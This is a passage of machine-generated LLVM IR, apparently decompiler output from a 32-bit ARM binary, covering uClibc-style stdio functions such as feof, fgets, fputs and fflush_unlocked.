  store i32 %v1_1374c, i32* @r0, align 4
  %v2_13750 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13750, i32* @r1, align 4
  %v0_13754 = call i32 @memcpy()
  store i32 %v0_13754, i32* %r0.global-to-local, align 4
  %v0_13758.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13758

dec_label_pc_13758:                               ; preds = %dec_label_pc_13728, %dec_label_pc_13740
  %v2_13774 = phi i32 [ %v0_13758.pre, %dec_label_pc_13740 ], [ %v0_13728, %dec_label_pc_13728 ]
  %v1_13758 = add i32 %v2_13774, 16
  %v2_13758 = inttoptr i32 %v1_13758 to i32*
  %v3_13758 = load i32, i32* %v2_13758, align 4
  store i32 %v3_13758, i32* %r3.global-to-local, align 4
  %v1_1375c = and i32 %v3_13758, 128
  %v2_1375c = icmp eq i32 %v1_1375c, 0
  br i1 %v2_1375c, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_13758
  store i32 %v2_13300, i32* %r3.global-to-local, align 4
  %v2_13764 = inttoptr i32 %v2_13774 to i32*
  %v3_13764 = load i32, i32* %v2_13764, align 4
  %v2_1376c.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_1376c = sub i32 %v2_1376c.pre, %v2_13300
  store i32 %v3_1376c, i32* %r3.global-to-local, align 4
  %v5_13770 = mul i32 %v3_1376c, 4
  %v6_13770 = add i32 %v5_13770, %v3_13764
  store i32 %v6_13770, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_13758
  %v1_1376841 = load i32, i32* %r6.global-to-local, align 4
  %v2_1376842 = add i32 %v1_1376841, 1
  store i32 %v2_1376842, i32* %r3.global-to-local, align 4
  %v3_13774 = inttoptr i32 %v2_13774 to i32*
  store i32 %v2_1376842, i32* %v3_13774, align 4
  %v0_13778.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_13780 = phi i32 [ %v2_13774, %.thread44 ], [ %v0_13778.pre, %.thread46 ]
  %v1_13778 = add i32 %v1_13780, 28
  %v2_13778 = inttoptr i32 %v1_13778 to i32*
  %v3_13778 = load i32, i32* %v2_13778, align 4
  store i32 %v3_13778, i32* %r3.global-to-local, align 4
  %v1_1377c = add i32 %v3_13778, 2
  store i32 %v1_1377c, i32* %r0.global-to-local, align 4
  %v0_13780 = load i32, i32* %sb.global-to-local, align 4
  %v2_13780 = add i32 %v1_13780, 24
  %v3_13780 = inttoptr i32 %v2_13780 to i32*
  store i32 %v0_13780, i32* %v3_13780, align 4
  br i1 %v2_1375c, label %dec_label_pc_13790, label %bb147

bb147:                                            ; preds = %bb146
  %v1_13784 = load i32, i32* @r2, align 4
  %v2_13784 = load i32, i32* %r7.global-to-local, align 4
  %v3_13784 = inttoptr i32 %v2_13784 to i32*
  store i32 %v1_13784, i32* %v3_13784, align 4
  br label %dec_label_pc_13790

dec_label_pc_1378c:                               ; preds = %dec_label_pc_13348, %dec_label_pc_13454, %dec_label_pc_13504, %dec_label_pc_134d8, %dec_label_pc_134e4, %dec_label_pc_13424, %dec_label_pc_136c4, %dec_label_pc_13670, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13790

dec_label_pc_13790:                               ; preds = %bb147, %bb146, %dec_label_pc_1378c
  %v2_13794 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_13794, i32* @r4, align 4
  store i32 %v6_132f8, i32* @r5, align 4
  %v26_13794 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_13794

; uselistorder directives
  uselistorder i32 %v3_1376c, { 1, 0 }
  uselistorder i32 %v1_1372c, { 1, 2, 0 }
  uselistorder i32 %v0_136e0, { 1, 2, 0 }
  uselistorder i32 %v2_136bc, { 1, 0 }
  uselistorder i32 %v1_136bc, { 1, 0, 2 }
  uselistorder i32 %v0_136dc, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_13620, { 1, 2, 0 }
  uselistorder i32 %v3_13608, { 1, 0 }
  uselistorder i32 %v3_13600, { 1, 0 }
  uselistorder i32 %v2_135e0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_135c8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_135ac, { 1, 0, 2 }
  uselistorder i32 %v3_1358c, { 2, 1, 0 }
  uselistorder i32 %v1_13550, { 0, 2, 3, 1 }
  uselistorder i32 %v2_13524, { 1, 0 }
  uselistorder i32 %v5_13484, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13484, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_13430, { 1, 0 }
  uselistorder i32 %v0_1344c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_13414, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_133fc, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_133e8, { 1, 2, 0 }
  uselistorder i32 %v0_13460, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1339c, { 1, 0 }
  uselistorder i32 %v1_1336c, { 0, 2, 1 }
  uselistorder i32 %v25_132f8, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 5, 9, 6, 0, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 3, 18 }
  uselistorder i32* %r6.global-to-local, { 14, 9, 12, 11, 3, 5, 13, 6, 7, 8, 0, 1, 2, 15, 4, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 15, 14, 49, 50, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 39, 40, 41, 37, 38, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 15, 10, 16, 14 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 5, 7, 6, 8, 9, 10, 11, 12, 13, 20, 19, 14, 22, 15, 16, 17, 23, 18, 24, 25, 1, 26, 27, 28, 21, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 38, { 1, 0, 2 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_23f18.1074 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_23f28.1072 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_23f44.1066 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_23f04.1064 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_13790, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1378c, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_13758, { 1, 0 }
  uselistorder label %dec_label_pc_13728, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13714, { 0, 2, 1 }
  uselistorder label %dec_label_pc_136d0, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_13688, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1353c, { 1, 0 }
  uselistorder label %dec_label_pc_13514, { 1, 0 }
  uselistorder label %dec_label_pc_134c4, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13444, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13440, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_133a0, { 1, 0 }
  uselistorder label %dec_label_pc_13390, { 1, 0 }
}

define i32 @feof(i8* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_137bc = load i32, i32* @r4, align 4
  store i32 %v3_137bc, i32* %stack_var_-16, align 4
  %v2_137c0 = add i32 %tmp, 52
  %v3_137c0 = inttoptr i32 %v2_137c0 to i32*
  %v4_137c0 = load i32, i32* %v3_137c0, align 4
  store i32 %v4_137c0, i32* %r6.global-to-local, align 4
  %v2_137c8 = ptrtoint i32* %stack_var_-32 to i32
  %v2_137cc = icmp eq i32 %v4_137c0, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %v2_137c8, i32* @r0, align 4
  br i1 %v2_137cc, label %dec_label_pc_137e4, label %dec_label_pc_13800

dec_label_pc_137e4:                               ; preds = %entry
  %v1_137ec = call i32 @__pthread_return_void()
  %v1_137fc = call i32 @__pthread_return_0()
  %v0_13800.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_13808.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13800

dec_label_pc_13800:                               ; preds = %entry, %dec_label_pc_137e4
  %v0_13808 = phi i32 [ %v4_137c0, %entry ], [ %v0_13808.pre, %dec_label_pc_137e4 ]
  %v0_13800 = phi i32 [ %tmp, %entry ], [ %v0_13800.pre, %dec_label_pc_137e4 ]
  %v1_13800 = add i32 %v0_13800, 1
  %v2_13800 = inttoptr i32 %v1_13800 to i8*
  %v3_13800 = load i8, i8* %v2_13800, align 1
  %v4_13800 = zext i8 %v3_13800 to i32
  %v1_13804 = inttoptr i32 %v0_13800 to i8*
  %v2_13804 = load i8, i8* %v1_13804, align 1
  %v3_13804 = zext i8 %v2_13804 to i32
  %v2_13808 = icmp eq i32 %v0_13808, 0
  %v4_13814 = mul nuw nsw i32 %v4_13800, 256
  %v5_13814 = or i32 %v3_13804, %v4_13814
  store i32 %v5_13814, i32* %r4.global-to-local, align 4
  br i1 %v2_13808, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13800
  call void @__pseudo_branch(i32 90076)
  %v0_13824.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13800, %bb
  %v0_13824 = phi i32 [ %v5_13814, %dec_label_pc_13800 ], [ %v0_13824.pre, %bb ]
  %v1_13824 = and i32 %v0_13824, 4
  %v2_1382c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1382c, i32* @r4, align 4
  ret i32 %v1_13824

; uselistorder directives
  uselistorder i32 %v0_13800, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_13800, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13840 = load i32, i32* @r4, align 4
  store i32 %v3_13840, i32* %stack_var_-24, align 4
  %v6_13840 = load i32, i32* @r5, align 4
  %v9_13840 = load i32, i32* @r6, align 4
  %v12_13840 = load i32, i32* @r7, align 4
  %v1_13844 = add i32 %arg3, 52
  %v2_13844 = inttoptr i32 %v1_13844 to i32*
  %v3_13844 = load i32, i32* %v2_13844, align 4
  store i32 %v3_13844, i32* %r8.global-to-local, align 4
  %v2_13848 = ptrtoint i32* %stack_var_-40 to i32
  %v1_1384c = add i32 %arg3, 56
  store i32 %v1_1384c, i32* @r5, align 4
  %v2_13850 = icmp eq i32 %v3_13844, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_13848, i32* @r0, align 4
  br i1 %v2_13850, label %dec_label_pc_13870, label %dec_label_pc_1388c

dec_label_pc_13870:                               ; preds = %entry
  %v1_13878 = call i32 @__pthread_return_void()
  store i32 80012, i32* @lr, align 4
  %v1_13888 = call i32 @__pthread_return_0()
  %v0_1388c.pre = load i32, i32* @r6, align 4
  %v0_13890.pre = load i32, i32* @r4, align 4
  %v0_13894.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1388c

dec_label_pc_1388c:                               ; preds = %entry, %dec_label_pc_13870
  %v0_13894 = phi i32 [ %arg1, %entry ], [ %v0_13894.pre, %dec_label_pc_13870 ]
  %v0_13890 = phi i32 [ %arg3, %entry ], [ %v0_13890.pre, %dec_label_pc_13870 ]
  %v0_1388c = phi i32 [ %arg2, %entry ], [ %v0_1388c.pre, %dec_label_pc_13870 ]
  %v3_13898 = inttoptr i32 %v0_13894 to i8*
  %v4_13898 = call i32 @__GI_fgets_unlocked(i8* %v3_13898, i32 %v0_1388c, i32 %v0_13890)
  %v0_1389c = load i32, i32* %r8.global-to-local, align 4
  %v2_1389c = icmp eq i32 %v0_1389c, 0
  store i32 %v4_13898, i32* %r4.global-to-local, align 4
  br i1 %v2_1389c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1388c
  store i32 80056, i32* @lr, align 4
  call void @__pseudo_branch(i32 90076)
  %v0_138b8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1388c, %bb
  %v0_138b8 = phi i32 [ %v4_13898, %dec_label_pc_1388c ], [ %v0_138b8.pre, %bb ]
  %v2_138c0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_138c0, i32* @r4, align 4
  store i32 %v6_13840, i32* @r5, align 4
  store i32 %v9_13840, i32* @r6, align 4
  store i32 %v12_13840, i32* @r7, align 4
  ret i32 %v0_138b8

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1388c, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_138d4 = load i32, i32* @r4, align 4
  store i32 %v3_138d4, i32* %stack_var_-20, align 4
  %v6_138d4 = load i32, i32* @r5, align 4
  %v9_138d4 = load i32, i32* @r6, align 4
  %v12_138d4 = load i32, i32* @r7, align 4
  %v1_138d8 = add i32 %arg2, 52
  %v2_138d8 = inttoptr i32 %v1_138d8 to i32*
  %v3_138d8 = load i32, i32* %v2_138d8, align 4
  store i32 %v3_138d8, i32* @r7, align 4
  %v1_138dc = add i32 %arg2, 56
  store i32 %v1_138dc, i32* @r5, align 4
  %v2_138e0 = ptrtoint i32* %stack_var_-36 to i32
  %v2_138e4 = icmp eq i32 %v3_138d8, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_138e0, i32* @r0, align 4
  br i1 %v2_138e4, label %dec_label_pc_13900, label %dec_label_pc_1391c

dec_label_pc_13900:                               ; preds = %entry
  %v1_13908 = call i32 @__pthread_return_void()
  store i32 80156, i32* @lr, align 4
  %v1_13918 = call i32 @__pthread_return_0()
  %v0_1391c.pre = load i32, i32* @r4, align 4
  %v0_13920.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1391c

dec_label_pc_1391c:                               ; preds = %entry, %dec_label_pc_13900
  %v0_13920 = phi i32 [ %arg1, %entry ], [ %v0_13920.pre, %dec_label_pc_13900 ]
  %v0_1391c = phi i32 [ %arg2, %entry ], [ %v0_1391c.pre, %dec_label_pc_13900 ]
  %v2_13924 = inttoptr i32 %v0_13920 to i8*
  %v3_13924 = call i32 @__GI_fputs_unlocked(i8* %v2_13924, i32 %v0_1391c)
  %v0_13928 = load i32, i32* @r7, align 4
  %v2_13928 = icmp eq i32 %v0_13928, 0
  store i32 %v3_13924, i32* %r4.global-to-local, align 4
  br i1 %v2_13928, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1391c
  call void @__pseudo_branch(i32 90076)
  %v0_13944.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1391c, %bb
  %v0_13944 = phi i32 [ %v3_13924, %dec_label_pc_1391c ], [ %v0_13944.pre, %bb ]
  %v2_1394c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1394c, i32* @r4, align 4
  store i32 %v6_138d4, i32* @r5, align 4
  store i32 %v9_138d4, i32* @r6, align 4
  store i32 %v12_138d4, i32* @r7, align 4
  ret i32 %v0_13944

; uselistorder directives
  uselistorder i32 (i8*, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1391c, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_13964 = ptrtoint i32* %stack_var_-48 to i32
  %v2_13968 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_13968, i32* @r0, align 4
  store i32 90076, i32* %r4.global-to-local, align 4
  %v1_1397c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_15fd4.998 to i32), i32* %r5.global-to-local, align 4
  %v1_1398c = call i32 @__pthread_return_0()
  %v2_13994 = load i32, i32* @global_var_31624.1004, align 4
  %v7_13998 = icmp eq i32 %v2_13994, 1
  br i1 %v7_13998, label %dec_label_pc_139a0, label %dec_label_pc_13a4c

dec_label_pc_139a0:                               ; preds = %entry
  %v2_139a4 = load i32, i32* @global_var_31628.1009, align 4
  %tmp19 = icmp slt i32 %v2_139a4, 1
  br i1 %tmp19, label %dec_label_pc_13a4c, label %dec_label_pc_139b0

dec_label_pc_139b0:                               ; preds = %dec_label_pc_139a0
  store i32 %v2_13964, i32* @r0, align 4
  %v1_139c0 = call i32 @__pthread_return_void()
  %v1_139cc = call i32 @__pthread_return_0()
  %v2_139d4 = load i32, i32* bitcast (i32** @global_var_2d2a8.1026 to i32*), align 4
  store i32 %v2_139d4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_13a243 = icmp eq i32 %v2_139d4, 0
  br i1 %v2_13a243, label %dec_label_pc_13a30, label %dec_label_pc_139e0

dec_label_pc_139e0:                               ; preds = %dec_label_pc_139b0, %dec_label_pc_13a20
  %v1_139f8 = phi i32 [ %v0_13a20, %dec_label_pc_13a20 ], [ %v2_139d4, %dec_label_pc_139b0 ]
  %v1_139e0 = inttoptr i32 %v1_139f8 to i8*
  %v2_139e0 = load i8, i8* %v1_139e0, align 1
  %v3_139e0 = zext i8 %v2_139e0 to i32
  %v1_139e4 = add i32 %v1_139f8, 1
  %v2_139e4 = inttoptr i32 %v1_139e4 to i8*
  %v3_139e4 = load i8, i8* %v2_139e4, align 1
  %v4_139e4 = zext i8 %v3_139e4 to i32
  %v4_139e8 = mul nuw nsw i32 %v4_139e4, 256
  %v5_139e8 = or i32 %v4_139e8, %v3_139e0
  %v2_139ec = and i32 %v5_139e8, 32816
  %v7_139f0 = icmp eq i32 %v2_139ec, 48
  %v1_139f4 = add i32 %v1_139f8, 32
  %v2_139f4 = inttoptr i32 %v1_139f4 to i32*
  %v3_139f4 = load i32, i32* %v2_139f4, align 4
  store i32 %v3_139f4, i32* %r5.global-to-local, align 4
  br i1 %v7_139f0, label %dec_label_pc_13a00, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_139e0
  store i32 %v1_139f8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13a20

dec_label_pc_13a00:                               ; preds = %dec_label_pc_139e0
  %v0_13a00 = load i32, i32* %r6.global-to-local, align 4
  %v2_13a00 = icmp eq i32 %v0_13a00, 0
  br i1 %v2_13a00, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_13a00
  %v3_13a08 = add i32 %v0_13a00, 32
  %v4_13a08 = inttoptr i32 %v3_13a08 to i32*
  store i32 %v3_139f4, i32* %v4_13a08, align 4
  %v0_13a10.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_13a00
  store i32 %v3_139f4, i32* bitcast (i32** @global_var_2d2a8.1026 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_13a10 = phi i32 [ %v0_13a10.pre, %.thread ], [ %v1_139f8, %.thread1 ]
  %v1_13a10 = add i32 %v0_13a10, 1
  %v2_13a10 = inttoptr i32 %v1_13a10 to i8*
  %v3_13a10 = load i8, i8* %v2_13a10, align 1
  %v1_13a14 = and i8 %v3_13a10, 32
  %v1_13a1c = icmp ne i8 %v1_13a14, 0
  call void @__pseudo_cond_branch(i1 %v1_13a1c, i32 ptrtoint (i32* @global_var_14ed0.1006 to i32))
  %v0_13a20.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13a20

dec_label_pc_13a20:                               ; preds = %.thread12, %bb
  %v0_13a20 = phi i32 [ %v0_13a20.pre, %bb ], [ %v3_139f4, %.thread12 ]
  store i32 %v0_13a20, i32* %r4.global-to-local, align 4
  %v2_13a24 = icmp eq i32 %v0_13a20, 0
  br i1 %v2_13a24, label %dec_label_pc_13a30, label %dec_label_pc_139e0

dec_label_pc_13a30:                               ; preds = %dec_label_pc_13a20, %dec_label_pc_139b0
  store i32 %v2_13964, i32* @r0, align 4
  %v1_13a40 = call i32 @__pthread_return_void()
  %v0_13a48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13a48, i32* @global_var_31628.1009, align 4
  %v2_13a50.pre = load i32, i32* @global_var_31624.1004, align 4
  br label %dec_label_pc_13a4c

dec_label_pc_13a4c:                               ; preds = %entry, %dec_label_pc_139a0, %dec_label_pc_13a30
  %v2_13a50 = phi i32 [ %v2_13994, %entry ], [ 1, %dec_label_pc_139a0 ], [ %v2_13a50.pre, %dec_label_pc_13a30 ]
  %v1_13a54 = add i32 %v2_13a50, -1
  store i32 %v1_13a54, i32* @global_var_31624.1004, align 4
  store i32 %v2_13968, i32* @r0, align 4
  store i32 80496, i32* @lr, align 4
  %v1_13a6c = call i32 @__pthread_return_void()
  ret i32 %v1_13a6c

; uselistorder directives
  uselistorder i32 %v0_13a20, { 2, 1, 0 }
  uselistorder i32 %v3_139f4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_139f8, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* @global_var_31628.1009, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13a4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13a20, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_139e0, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_13aa0 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_2d2a8.1026 to i32), i32* %r3.global-to-local, align 4
  %v10_13aa8 = icmp eq i8* %arg1, bitcast (i32** @global_var_2d2a8.1026 to i8*)
  store i1 %v10_13aa8, i1* %cpsr_z.global-to-local, align 1
  %.v1_13aac = select i1 %v10_13aa8, i32 0, i32 %tmp
  store i32 %.v1_13aac, i32* %r8.global-to-local, align 4
  %v2_13ab4 = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_13aa8, label %bb, label %dec_label_pc_13ac0

bb:                                               ; preds = %entry
  store i32 %.v1_13aac, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_13acc

dec_label_pc_13ac0:                               ; preds = %entry
  %v2_13ac0 = icmp eq i32 %.v1_13aac, 0
  store i1 %v2_13ac0, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_13ac0, label %dec_label_pc_13acc, label %dec_label_pc_13c18

dec_label_pc_13acc:                               ; preds = %bb, %dec_label_pc_13ac0
  store i32 ptrtoint (i8* @global_var_15fd4.998 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_13ab4, i32* @r0, align 4
  %v1_13ae0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2d2c4.1002 to i32), i32* %r0.global-to-local, align 4
  %v1_13af0 = call i32 @__pthread_return_0()
  %v2_13af8 = load i32, i32* @global_var_31624.1004, align 4
  %v1_13afc = add i32 %v2_13af8, 1
  store i32 %v1_13afc, i32* %r3.global-to-local, align 4
  store i32 %v1_13afc, i32* @global_var_31624.1004, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_13ab4, i32* @r0, align 4
  %v1_13b14 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_15fd4.998 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_13ab4, i32* @r0, align 4
  %v1_13b28 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2d2ac.1023 to i32), i32* %r0.global-to-local, align 4
  %v1_13b34 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_2d2a8.1026 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_13ab4, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_13b44 = load i32, i32* bitcast (i32** @global_var_2d2a8.1026 to i32*), align 4
  store i32 %v2_13b44, i32* @r6, align 4
  %v1_13b4c = call i32 @__pthread_return_void()
  store i32 %v1_13b4c, i32* %r0.global-to-local, align 4
  store i32 %v2_13ab4, i32* @r4, align 4
  %v0_13b54 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13b54, i32* @r5, align 4
  %v0_13c08.pr = load i32, i32* @r6, align 4
  %v2_13c0825 = icmp eq i32 %v0_13c08.pr, 0
  store i1 %v2_13c0825, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13c0825, label %dec_label_pc_13c10, label %dec_label_pc_13b5c

dec_label_pc_13b5c:                               ; preds = %dec_label_pc_13acc, %.thread11
  %v0_13b78 = phi i32 [ %v3_13c04, %.thread11 ], [ %v0_13c08.pr, %dec_label_pc_13acc ]
  %v1_13b5c = inttoptr i32 %v0_13b78 to i8*
  %v2_13b5c = load i8, i8* %v1_13b5c, align 1
  %v3_13b5c = zext i8 %v2_13b5c to i32
  store i32 %v3_13b5c, i32* %r3.global-to-local, align 4
  %v1_13b60 = and i32 %v3_13b5c, 64
  %v2_13b60 = icmp eq i32 %v1_13b60, 0
  store i1 %v2_13b60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13b60, label %.thread11, label %dec_label_pc_13b68

dec_label_pc_13b68:                               ; preds = %dec_label_pc_13b5c
  %v2_13b6c = load i32, i32* @global_var_2d2dc.1017, align 4
  store i32 %v2_13b6c, i32* %r3.global-to-local, align 4
  %v7_13b70 = icmp eq i32 %v2_13b6c, 2
  store i1 %v7_13b70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13b70, label %dec_label_pc_13ba4, label %dec_label_pc_13b78

dec_label_pc_13b78:                               ; preds = %dec_label_pc_13b68
  %v1_13b78 = add i32 %v0_13b78, 56
  store i32 %v1_13b78, i32* @r4, align 4
  store i32 %v2_13ab4, i32* @r0, align 4
  store i32 90076, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_15fd4.998 to i32), i32* %r1.global-to-local, align 4
  %v1_13b90 = call i32 @__pthread_return_void()
  %v0_13b94 = load i32, i32* @r4, align 4
  store i32 %v0_13b94, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_15fd4.998 to i32), i32* %r3.global-to-local, align 4
  %v1_13ba0 = call i32 @__pthread_return_0()
  store i32 %v1_13ba0, i32* %r0.global-to-local, align 4
  %v0_13ba4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13ba4

dec_label_pc_13ba4:                               ; preds = %dec_label_pc_13b68, %dec_label_pc_13b78
  %v0_13bb8 = phi i32 [ %v0_13b78, %dec_label_pc_13b68 ], [ %v0_13ba4.pre, %dec_label_pc_13b78 ]
